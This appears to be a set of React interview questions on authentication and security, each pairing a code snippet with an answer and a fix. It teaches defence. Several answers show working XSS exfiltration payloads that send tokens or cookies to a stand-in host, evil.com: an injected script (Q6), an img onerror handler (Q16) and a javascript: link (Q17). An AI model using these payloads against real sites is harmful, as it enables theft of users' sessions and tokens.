## Auth and Security — Tricky Output Questions

> These questions test your ability to identify security vulnerabilities, predict auth state behavior, reason through race conditions in auth flows, and spot common token management mistakes. Each question reflects a real scenario from senior React interviews.

---

## 1. Protected Routes

### Q1

```jsx
function ProtectedRoute() {
  const { isAuthenticated } = useAuth();

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  return <Outlet />;
}

function useAuth() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  useEffect(() => {
    validateToken().then(valid => setIsAuthenticated(valid));
  }, []);

  return { isAuthenticated };
}
```

#### ❓ A logged-in user navigates to `/dashboard` (a protected route). What do they see momentarily on every page load?

<details>
<summary>✅ Answer</summary>

```txt
They are briefly redirected to the /login page before being redirected back.
```

**Explanation:** On the first render, `isAuthenticated` is `false` (initial state). The `ProtectedRoute` sees `false` and immediately renders `<Navigate to="/login" replace />`. The user experiences a flash of the login page. Then `validateToken()` resolves, `setIsAuthenticated(true)` triggers a re-render, and the user is redirected to `/dashboard`. Fix: add an `isLoading` state that starts `true`, keeping the route in a loading state until the token check completes.

</details>

---

### Q2

```jsx
function ProtectedRoute({ isAuthenticated, isLoading }) {
  const location = useLocation();

  if (isLoading) return <div>Checking auth...</div>;

  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  return <Outlet />;
}

function LoginPage() {
  const navigate = useNavigate();
  const location = useLocation();

  async function handleLogin(e) {
    e.preventDefault();
    await login(credentials);
    navigate('/dashboard'); // hardcoded redirect
  }
}
```

#### ❓ A user tries to visit `/settings` but is redirected to `/login`. After they log in, where do they land?

<details>
<summary>✅ Answer</summary>

```txt
They land on /dashboard, not /settings.
The originally intended destination is lost.
```

**Explanation:** `ProtectedRoute` saves `location` in `state.from` — so the state is available at login. But `LoginPage` hardcodes `navigate('/dashboard')` and never reads `location.state?.from`. Fix: replace the hardcoded path with `const from = location.state?.from?.pathname ?? '/dashboard'` and navigate to `from` after login.

</details>

---

### Q3

```jsx
function RoleRoute({ allowedRoles }) {
  const { user } = useAuth();

  if (!allowedRoles.includes(user?.role)) {
    return <Navigate to="/unauthorized" replace />;
  }

  return <Outlet />;
}

// Route configuration
<Route element={<ProtectedRoute />}>
  <Route element={<RoleRoute allowedRoles={['admin']} />}>
    <Route path="/admin" element={<AdminPanel />} />
  </Route>
</Route>
```

#### ❓ What is the vulnerability in `AdminPanel` even with this frontend route guard?

<details>
<summary>✅ Answer</summary>

```txt
A non-admin user can access /admin data by calling the API directly,
bypassing the frontend route guard entirely.

curl -H "Authorization: Bearer <non-admin-token>" GET /api/admin/users
```

**Explanation:** Frontend route guards are UI convenience — they improve UX by hiding routes the user cannot access. They provide zero security. Any attacker with a valid access token (regardless of role) can call your backend APIs directly using curl, Postman, or a custom script. The backend must independently verify the user's role on every sensitive endpoint.

</details>

---

### Q4

```jsx
function App() {
  const [authState, setAuthState] = useState({
    user: null,
    isAuthenticated: false,
    isLoading: true,
  });

  useEffect(() => {
    refreshToken()
      .then(token => fetchUser(token))
      .then(user => setAuthState({ user, isAuthenticated: true, isLoading: false }))
      .catch(() => setAuthState({ user: null, isAuthenticated: false, isLoading: false }));
  }, []);

  if (authState.isLoading) return <AppSkeleton />;

  return (
    <AuthContext.Provider value={authState}>
      <Routes>
        <Route element={<ProtectedRoute />}>
          <Route path="/dashboard" element={<Dashboard />} />
        </Route>
        <Route path="/login" element={<LoginPage />} />
      </Routes>
    </AuthContext.Provider>
  );
}
```

#### ❓ Is there a flash of content problem here? Why or why not?

<details>
<summary>✅ Answer</summary>

```txt
No flash problem. The entire app renders <AppSkeleton /> while
isLoading is true. Neither /dashboard nor /login renders until
the auth check is complete.
```

**Explanation:** Because `isLoading` starts as `true` and the entire route tree is blocked behind the skeleton, users never see a protected route flash. When `isLoading` becomes `false`, the correct route renders immediately based on `isAuthenticated`. This is the correct top-level pattern — centralize the loading state at the app level rather than inside individual `ProtectedRoute` components.

</details>

---

### Q5

```jsx
function ProtectedRoute() {
  const { isAuthenticated } = useAuth();
  return isAuthenticated ? <Outlet /> : <Navigate to="/login" replace />;
}

// In App.jsx
<Route path="/login" element={
  isAuthenticated ? <Navigate to="/dashboard" replace /> : <LoginPage />
} />
```

#### ❓ A logged-out user visits `/login`. An authenticated user visits `/login`. What happens in each case?

<details>
<summary>✅ Answer</summary>

```txt
Logged-out user visiting /login:
  isAuthenticated is false → LoginPage renders normally.

Authenticated user visiting /login:
  isAuthenticated is true → Navigate to /dashboard replace.
  The user is redirected to /dashboard instantly.
```

**Explanation:** This is the correct pattern for preventing authenticated users from accessing the login page. `replace` ensures the login route is removed from history so the back button doesn't return them to login. Without this guard, an authenticated user clicking "Back" from the dashboard would see the login page again.

</details>

---

## 2. Token Management

### Q6

```jsx
function login(credentials) {
  return fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify(credentials),
  })
    .then(res => res.json())
    .then(data => {
      localStorage.setItem('accessToken', data.accessToken);
      localStorage.setItem('refreshToken', data.refreshToken);
    });
}
```

#### ❓ What security vulnerability does storing both tokens in localStorage introduce?

<details>
<summary>✅ Answer</summary>

```txt
XSS vulnerability. Any JavaScript running on the page (including
injected scripts from XSS attacks) can read localStorage:

// Attacker's injected script
const token = localStorage.getItem('accessToken');
fetch('https://evil.com/steal?token=' + token);

With both tokens in localStorage, an attacker gains persistent access
(using the refresh token to obtain new access tokens indefinitely).
```

**Explanation:** `localStorage` is accessible to any JavaScript on the page — including scripts from XSS attacks, compromised third-party dependencies (supply chain attacks), or browser extensions. The `refreshToken` is especially dangerous because its long lifetime means stolen access outlasts the access token's expiry. The refresh token should be stored in an `httpOnly` cookie which JavaScript cannot read.

</details>

---

### Q7

```jsx
// User logs in — both tokens stored in localStorage
localStorage.setItem('accessToken', 'eyJ...');
localStorage.setItem('refreshToken', 'eyJ...');

// User closes the tab and reopens the browser next day
const token = localStorage.getItem('accessToken');
console.log(token); // ???
```

#### ❓ What does `console.log(token)` output the next day?

<details>
<summary>✅ Answer</summary>

```txt
The access token string — localStorage persists across sessions indefinitely
until explicitly cleared.
```

**Explanation:** Unlike `sessionStorage` which is cleared when the tab/window closes, `localStorage` persists until explicitly deleted via `localStorage.removeItem()` or `localStorage.clear()`, or until the user clears browser data. This makes localStorage suitable for remembering preferences but dangerous for sensitive tokens — a stolen device grants perpetual access until logout.

</details>

---

### Q8

```jsx
function authFetch(url, options = {}) {
  const token = localStorage.getItem('accessToken');

  return fetch(url, {
    ...options,
    headers: { ...options.headers, Authorization: `Bearer ${token}` },
  }).then(async res => {
    if (res.status === 401) {
      // Token expired — refresh it
      const newToken = await refreshTokenRequest();
      localStorage.setItem('accessToken', newToken);
      // Retry the original request
      return fetch(url, {
        ...options,
        headers: { ...options.headers, Authorization: `Bearer ${newToken}` },
      });
    }
    return res;
  });
}
```

#### ❓ Three API requests fire simultaneously and all receive 401. What problem occurs?

<details>
<summary>✅ Answer</summary>

```txt
Three simultaneous token refresh requests fire.
This is a "thundering herd" problem.

Possible outcomes:
1. The server may reject duplicate refresh requests (if single-use tokens)
2. Three new access tokens are generated — two are immediately stale
3. Race condition: the third refresh may overwrite the first in localStorage
   while the first retry is already in flight with a different token
```

**Explanation:** Without a refresh lock, every concurrent 401 response independently triggers its own refresh attempt. The fix is a "queuing" interceptor: set a `isRefreshing` flag, queue all concurrent 401 requests, perform a single refresh, then retry all queued requests with the new token. This is the standard pattern for production token refresh interceptors.

</details>

---

### Q9

```jsx
async function logout() {
  localStorage.removeItem('accessToken');
  navigate('/login');
}
```

#### ❓ What critical security step is missing from this logout implementation?

<details>
<summary>✅ Answer</summary>

```txt
The refresh token is not invalidated on the server.

If the refresh token is in an httpOnly cookie or localStorage,
it still exists and can be used to generate new access tokens
even after the user "logged out".

An attacker who captured the refresh token now has permanent access
regardless of the user logging out.
```

**Explanation:** Client-side logout only removes the access token from the client's storage. It does not tell the server to invalidate the refresh token. The server must add the refresh token to a denylist (or delete the session record) to prevent it from being reused. Fix: call `POST /api/auth/logout` with `credentials: 'include'` before clearing client state, so the server can invalidate the refresh token.

</details>

---

### Q10

```jsx
const token = localStorage.getItem('token');

// Decode without verification (just base64 decode the payload)
const payload = JSON.parse(atob(token.split('.')[1]));
const userRole = payload.role;

// Use role for access control
if (userRole === 'admin') {
  showAdminUI();
}
```

#### ❓ What is the critical security flaw in this approach?

<details>
<summary>✅ Answer</summary>

```txt
JWT payloads are base64-encoded, NOT encrypted.
Anyone can modify the token's payload:

1. Decode: atob("eyJyb2xlIjoiYWRtaW4ifQ==") → {"role":"admin"}
2. Change: {"role":"user"} → {"role":"admin"}
3. Re-encode: btoa(JSON.stringify({role:"admin"}))
4. Replace the payload segment in the JWT
5. The signature is now invalid — but this code never checks the signature

The client is trusting its OWN decoding of an unverified token for
security decisions. The backend must ALWAYS verify the JWT signature.
Frontend should never make security decisions based on decoded JWT payloads.
```

**Explanation:** JWT signature verification (using the secret key) can only happen on the server. Client-side JWT decoding reads the payload but cannot verify that the signature matches the contents. The decoded `role` could be tampered. Frontend role checks are for UX only; the backend must re-verify the JWT and the user's role on every protected API call.

</details>

---

## 3. Auth Context

### Q11

```jsx
export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const isAuthenticated = !!user;

  return (
    <AuthContext.Provider value={{ user, isAuthenticated, setUser }}>
      {children}
    </AuthContext.Provider>
  );
}
```

#### ❓ The user refreshes the page. What is `user` on the first render? What does `isAuthenticated` show?

<details>
<summary>✅ Answer</summary>

```txt
user: null
isAuthenticated: false

The user sees the logged-out state briefly (or permanently if no silent refresh).
```

**Explanation:** `useState(null)` initializes `user` as `null` on every page load. React state does not persist across page reloads — it is always re-initialized from scratch. If there is no mechanism to restore auth state (like reading a token from an httpOnly cookie via a `/api/auth/me` call on mount), the user appears logged out after every refresh. Fix: add a `useEffect` on mount that calls a refresh endpoint to restore the session.

</details>

---

### Q12

```jsx
const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(
    () => JSON.parse(localStorage.getItem('user'))
  );

  function logout() {
    localStorage.removeItem('user');
    setUser(null);
  }

  return (
    <AuthContext.Provider value={{ user, logout }}>
      {children}
    </AuthContext.Provider>
  );
}
```

#### ❓ This design stores the user object in localStorage for persistence across reloads. What security concerns does this introduce?

<details>
<summary>✅ Answer</summary>

```txt
1. XSS can read the user object including any sensitive fields:
   JSON.parse(localStorage.getItem('user')) exposes role, email, etc.

2. The user object may become stale:
   If the user's role changes server-side, the outdated role is read
   from localStorage on the next page load.

3. The user object from localStorage cannot be trusted for security:
   An attacker could modify it: localStorage.setItem('user', '{"role":"admin"}')
   If any frontend code uses this for access decisions, it's vulnerable.
```

**Explanation:** Storing user metadata in localStorage is a common pattern for UX purposes (showing the user's name/avatar without a network request). However, it must never be trusted for security decisions. Only the access token (validated by the server) establishes actual authentication. The stored user object should only be used for display purposes, with all security-relevant checks happening server-side.

</details>

---

### Q13

```jsx
function useAuth() {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    fetchCurrentUser()
      .then(setUser)
      .catch(() => setUser(null))
      .finally(() => setIsLoading(false));
  }, []);

  function updateUser(newData) {
    setUser(prev => ({ ...prev, ...newData }));
  }

  return { user, isLoading, updateUser };
}
```

#### ❓ A user updates their display name in the profile settings. `updateUser({ name: 'Alice Smith' })` is called. Is the server updated?

<details>
<summary>✅ Answer</summary>

```txt
No. Only the local React state is updated.
The server still has the old name until an API call is made.
If the user refreshes, fetchCurrentUser() will return the old name.
```

**Explanation:** `updateUser` only mutates the client-side `user` state. It does not persist the change to the server. The UI updates immediately (optimistic), but the data is not saved. Fix: ensure `updateUser` also makes an API call (`PATCH /api/user`) and only updates local state after the server confirms success. Or, use `updateUser` for optimistic updates and call `fetchCurrentUser` after the API call to sync from the server.

</details>

---

### Q14

```jsx
export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);

  async function login(email, password) {
    const data = await apiLogin(email, password);
    setUser(data.user);
    // accessToken handled by httpOnly cookie automatically
  }

  async function logout() {
    await apiLogout();
    setUser(null);
  }

  return (
    <AuthContext.Provider value={{ user, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

// In two tabs:
// Tab A: User is logged in
// Tab B: User calls logout
```

#### ❓ After the user logs out in Tab B, what state does Tab A show?

<details>
<summary>✅ Answer</summary>

```txt
Tab A still shows the authenticated state (user data in React state).
Tab A is unaware of the logout in Tab B.
```

**Explanation:** React state is not shared between browser tabs. When Tab B calls `setUser(null)`, it only updates that tab's React state. Tab A continues to have `user` populated in memory. Additionally, if the access token was in localStorage, Tab A could continue making authenticated API calls even though Tab B logged out. Fix: use the `storage` event to detect logout across tabs, or use a Service Worker, or invalidate the server-side session so API calls fail in Tab A.

```jsx
useEffect(() => {
  function handleStorageChange(e) {
    if (e.key === 'logout') setUser(null);
  }
  window.addEventListener('storage', handleStorageChange);
  return () => window.removeEventListener('storage', handleStorageChange);
}, []);
```

</details>

---

### Q15

```jsx
function ProfilePage() {
  const { user } = useAuth();

  const [formData, setFormData] = useState({
    name: user?.name ?? '',
    email: user?.email ?? '',
  });

  return (
    <form>
      <input value={formData.name} onChange={e =>
        setFormData(prev => ({ ...prev, name: e.target.value }))
      } />
    </form>
  );
}
```

#### ❓ The auth context loads the user asynchronously. `user` is `null` on first render. Does the form auto-populate when `user` loads?

<details>
<summary>✅ Answer</summary>

```txt
No. The form stays empty even after user loads.
```

**Explanation:** `useState({ name: user?.name ?? '' })` runs once with `user = null`, initializing both fields as `''`. When `user` eventually loads and the auth context updates, `ProfilePage` re-renders, but `useState` ignores its initial value argument after the first render. The form values remain `''`. Fix: use `useEffect` to sync form state when user loads, or key the component to reset on user load: `<ProfilePage key={user?.id} />`.

</details>

---

## 4. XSS and Security

### Q16

```jsx
function CommentList({ comments }) {
  return (
    <ul>
      {comments.map(comment => (
        <li
          key={comment.id}
          dangerouslySetInnerHTML={{ __html: comment.body }}
        />
      ))}
    </ul>
  );
}
```

#### ❓ A comment body contains: `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`. What happens when this comment renders?

<details>
<summary>✅ Answer</summary>

```txt
The attacker's script executes:
1. The browser tries to load an image from "x" (fails)
2. onerror fires
3. fetch() sends the user's cookies to evil.com
4. If the session cookie is not httpOnly, it is now stolen.
```

**Explanation:** `dangerouslySetInnerHTML` renders raw HTML without escaping. The `onerror` event handler on the broken image executes JavaScript. This is a stored XSS attack — the malicious content was stored on the server and now executes in every viewer's browser. Fix: sanitize with `DOMPurify.sanitize(comment.body)` before passing to `dangerouslySetInnerHTML`, or render comments as plain text using `{comment.body}` (which React safely escapes).

</details>

---

### Q17

```jsx
function UserProfile({ user }) {
  return (
    <div>
      <h1>{user.name}</h1>
      <p>Website: <a href={user.website}>{user.website}</a></p>
    </div>
  );
}

// User has entered their website as:
// javascript:fetch('https://evil.com?token='+localStorage.getItem('token'))
```

#### ❓ What happens when another user clicks the "website" link?

<details>
<summary>✅ Answer</summary>

```txt
The attacker's JavaScript executes in the victim's browser context.
It reads the token from localStorage and sends it to the attacker's server.
```

**Explanation:** React escapes text content but does NOT sanitize `href` values for `javascript:` protocol. This is a URL injection XSS attack. Clicking the link executes the `javascript:` URI as JavaScript in the page's context. Fix: validate the URL scheme before rendering.

```jsx
function SafeLink({ href, children }) {
  const safe = /^https?:\/\//.test(href) || href.startsWith('/');
  return safe ? <a href={href}>{children}</a> : <span>{children}</span>;
}
```

</details>

---

### Q18

```jsx
const userInput = '<script>alert("xss")</script>';

function App() {
  return <p>{userInput}</p>;
}
```

#### ❓ Does the script execute? What does the browser display?

<details>
<summary>✅ Answer</summary>

```txt
The script does NOT execute.
The browser displays the literal text:
<script>alert("xss")</script>
```

**Explanation:** React automatically escapes all JSX text content. The `<` and `>` characters are converted to `&lt;` and `&gt;` HTML entities. The browser renders them as text, not as HTML tags. This is one of React's core security features — JSX expressions `{value}` are always safe for displaying user-controlled text content.

</details>

---

### Q19

```jsx
function App() {
  const [csrfToken] = useState(() =>
    document.querySelector('meta[name="csrf-token"]')?.content
  );

  async function deletePost(postId) {
    await fetch(`/api/posts/${postId}`, {
      method: 'DELETE',
      headers: {
        'X-CSRF-Token': csrfToken,
        Authorization: `Bearer ${getAccessToken()}`,
      },
      credentials: 'include',
    });
  }
}
```

#### ❓ This app uses JWT (Authorization header) for authentication. Is a CSRF token necessary? Why or why not?

<details>
<summary>✅ Answer</summary>

```txt
No, a CSRF token is not necessary when using JWT in the Authorization header.
```

**Explanation:** CSRF attacks work by exploiting automatic cookie sending — the browser automatically includes cookies with cross-origin requests. A CSRF attacker's page can trigger `fetch('https://yoursite.com/api/delete', { method: 'POST' })` and the browser attaches the session cookie. However, an attacker's page CANNOT set custom headers like `Authorization: Bearer <token>` due to CORS restrictions. JWTs passed in Authorization headers are inherently CSRF-resistant. CSRF protection is needed for cookie-based authentication, not header-based JWT authentication.

</details>

---

### Q20

```jsx
// Environment variables in a Vite React app
const STRIPE_PUBLISHABLE_KEY = import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY;
const STRIPE_SECRET_KEY = import.meta.env.VITE_STRIPE_SECRET_KEY; // Added for convenience
const DB_URL = import.meta.env.VITE_DATABASE_URL; // Added for direct DB access
```

#### ❓ What are the security implications of `VITE_STRIPE_SECRET_KEY` and `VITE_DATABASE_URL` being in the frontend?

<details>
<summary>✅ Answer</summary>

```txt
CRITICAL vulnerability. All VITE_ variables are bundled into the
JavaScript served to every user. Anyone can:

1. Open DevTools → Sources → search the .js bundle
2. Find the secret key and database URL as plaintext strings
3. Use STRIPE_SECRET_KEY to make charges, refunds, cancel subscriptions
4. Use DATABASE_URL to connect directly to the database and read/write all data

Both secrets are permanently compromised for anyone who loads the page.
```

**Explanation:** Only `VITE_STRIPE_PUBLISHABLE_KEY` is safe on the frontend — it is designed to be public. Secret keys and database URLs must never leave the server. They belong in server-side environment variables that are never embedded in client bundles. The only fix is to remove them from frontend env vars and move all secret-key operations to a backend API.

</details>

---

## 5. Edge Cases

### Q21

```jsx
function useAuthPersistence() {
  const [user, setUser] = useState(null);

  useEffect(() => {
    // On mount: try to restore session
    const savedUser = localStorage.getItem('user');
    if (savedUser) {
      setUser(JSON.parse(savedUser));
    }
  }, []);

  function login(userData) {
    setUser(userData);
    localStorage.setItem('user', JSON.stringify(userData));
  }

  function logout() {
    setUser(null);
    localStorage.removeItem('user');
  }

  return { user, login, logout };
}
```

#### ❓ What happens if `localStorage.getItem('user')` returns a corrupted JSON string?

<details>
<summary>✅ Answer</summary>

```txt
JSON.parse() throws a SyntaxError.
The useEffect has no error handling, so the error propagates to React,
potentially crashing the entire app with an uncaught error.
```

**Explanation:** `JSON.parse` throws synchronously on invalid JSON. In a `useEffect` callback, an uncaught synchronous throw propagates outside React's error boundary handling and becomes an unhandled exception. Fix: wrap in try/catch.

```jsx
useEffect(() => {
  try {
    const saved = localStorage.getItem('user');
    if (saved) setUser(JSON.parse(saved));
  } catch {
    localStorage.removeItem('user'); // clear corrupted data
  }
}, []);
```

</details>

---

### Q22

```jsx
function useAutoRefresh() {
  const { accessToken, setAccessToken } = useAuth();

  useEffect(() => {
    // Refresh token 1 minute before it expires
    const token = parseJwt(accessToken);
    const expiresIn = token.exp * 1000 - Date.now() - 60000; // 1 min before expiry

    const timer = setTimeout(async () => {
      const newToken = await refreshToken();
      setAccessToken(newToken);
    }, expiresIn);

    return () => clearTimeout(timer);
  }, [accessToken]);
}
```

#### ❓ The access token is refreshed successfully. `accessToken` state changes. What happens to the `useEffect`?

<details>
<summary>✅ Answer</summary>

```txt
The effect re-runs because accessToken is in the dependency array.
A new setTimeout is scheduled for 1 minute before the NEW token's expiry.
The previous timer is cleaned up by the cleanup function.
This creates a perpetual auto-refresh cycle.
```

**Explanation:** This is the correct behavior for silent token refresh. Each time the token is refreshed, the effect detects the new `accessToken`, cancels the old timer, and schedules a new one for the new token's expiry. The cycle continues as long as the user is active and refreshes succeed. If a refresh fails (network error, server invalidates refresh token), the error should redirect the user to login.

</details>

---

### Q23

```jsx
function LoginPage() {
  const [loading, setLoading] = useState(false);
  const { login } = useAuth();

  async function handleSubmit(e) {
    e.preventDefault();
    setLoading(true);
    try {
      await login(email, password);
      navigate('/dashboard');
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }
}
```

#### ❓ The component unmounts (user navigates away) while the login request is in flight. `setLoading(false)` fires after unmount. What happens?

<details>
<summary>✅ Answer</summary>

```txt
In older React: "Warning: Can't perform a React state update on an unmounted component."
In React 18+: The warning was removed — React silently ignores state updates on unmounted components.

Functionally: No visible problem. The state update is discarded.
```

**Explanation:** React 18 removed the "unmounted component" warning because it was frequently a false alarm and the behavior (ignoring the update) is actually correct. However, the `navigate('/dashboard')` after `await login()` might still run if the login succeeded, which could cause unexpected navigation from an already-different page. A ref guard (`isMounted`) or `AbortController` can prevent this in critical flows.

</details>

---

### Q24

```jsx
async function handleLogin() {
  const res = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  });

  if (res.status === 429) {
    setError('Too many attempts. Try again in 15 minutes.');
    return;
  }

  const data = await res.json();
  setUser(data.user);
}
```

#### ❓ What is the HTTP 429 status and why does the server return it for login attempts?

<details>
<summary>✅ Answer</summary>

```txt
429 Too Many Requests — rate limiting.

The server returns 429 after N failed login attempts in a time window
to prevent brute-force attacks.

Without rate limiting, an attacker could try millions of password
combinations (dictionary attack, credential stuffing) until they
find valid credentials.
```

**Explanation:** Rate limiting on login endpoints is a critical security control. Common implementations: 5 failed attempts per IP per 15 minutes (IP-based), or 10 attempts per email per hour (account-based). The server may also return 429 on successful attempts if the IP is making too many requests, helping prevent credential stuffing. The frontend should display a helpful message and optionally a countdown timer.

</details>

---

### Q25

```jsx
function useAuthenticatedFetch() {
  const { accessToken, refreshAccessToken, logout } = useAuth();

  return useCallback(async (url, options = {}) => {
    // Attempt request with current token
    let response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${accessToken}`,
      },
    });

    // If 401, try refreshing token once
    if (response.status === 401) {
      try {
        const newToken = await refreshAccessToken();
        response = await fetch(url, {
          ...options,
          headers: {
            ...options.headers,
            Authorization: `Bearer ${newToken}`,
          },
        });
      } catch {
        logout(); // refresh failed — session expired
        throw new Error('Session expired');
      }
    }

    return response;
  }, [accessToken, refreshAccessToken, logout]);
}
```

#### ❓ Describe the complete behavior when an access token expires and three API calls fire simultaneously.

<details>
<summary>✅ Answer</summary>

```txt
Problem: Three simultaneous 401 responses each independently call
refreshAccessToken() — three refresh requests fire simultaneously.

Possible outcomes:
1. If refresh tokens are single-use: only the first refresh succeeds.
   The second and third refresh calls fail, triggering three logout() calls.
   User is forcibly logged out even though the first refresh succeeded.

2. Even if all three refreshes succeed, three different access tokens
   may be generated. Each retry uses its own token, causing inconsistency.

Fix: Implement a refresh lock (isRefreshing flag) and a pending queue:
- First 401: set isRefreshing = true, execute refresh
- Second/third 401: queue the retry (don't call refresh again)
- After refresh resolves: process queue with the new token
```

**Explanation:** This is the "thundering herd" problem in token refresh. The `useCallback` hook creates a per-component instance of the fetch wrapper, so multiple components each have their own `accessToken` closure and each independently handle the 401. The fix requires a shared, application-level refresh lock outside of React's component tree — typically implemented as a module-level variable in an axios/fetch interceptor.

</details>

---

## Topics Covered

| Category | Questions | Key Concepts |
|---|---|---|
| Protected Routes | Q1 – Q5 | Auth check flash, preserving intended destination, frontend-only guards, isLoading guard, redirect for authenticated users |
| Token Management | Q6 – Q10 | localStorage XSS risk, persistence across sessions, concurrent 401 thundering herd, missing server logout, client-side JWT decoding |
| Auth Context | Q11 – Q15 | State reset on page reload, localStorage user object risks, client vs server state, multi-tab logout, async user init for forms |
| XSS / Security | Q16 – Q20 | stored XSS via dangerouslySetInnerHTML, URL injection via href, React's automatic escaping, CSRF vs JWT, leaked env secrets |
| Edge Cases | Q21 – Q25 | Corrupted localStorage JSON, auto-refresh cycle, setState on unmount in React 18, rate limiting 429, concurrent 401 refresh race |
